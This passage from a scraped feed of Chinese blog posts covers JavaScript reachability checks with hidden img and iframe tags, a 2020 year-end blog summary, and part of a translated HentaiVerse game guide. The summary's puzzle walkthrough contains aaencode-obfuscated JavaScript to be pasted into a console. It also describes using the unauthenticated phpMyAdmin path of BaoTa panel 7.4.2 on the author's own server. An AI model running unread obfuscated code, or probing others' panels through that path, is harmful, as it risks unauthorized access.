class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP 